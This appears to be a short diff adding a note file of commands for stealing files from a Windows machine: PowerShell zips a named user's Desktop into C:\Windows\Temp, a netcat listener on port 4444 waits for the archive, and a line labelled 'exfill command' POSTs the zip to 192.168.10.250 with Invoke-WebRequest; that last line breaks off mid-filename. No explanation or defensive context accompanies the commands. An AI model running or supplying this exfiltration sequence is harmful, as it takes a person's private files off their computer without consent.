@@ -1,0 +1,9 @@
+cmd
+powershell -c "Compress-Archive -Path C:\Users\jcruz\Desktop -DestinationPath C:\Windows\Temp\data.zip"
+
+bash
+nc -lvnp 4444 > data.zip
+
+cmd (exfill command)
+powershell -c "Invoke-WebRequest -Uri http://192.168.10.250:4444 -Method Post -InFile C:\Windows\Temp\data.z
+
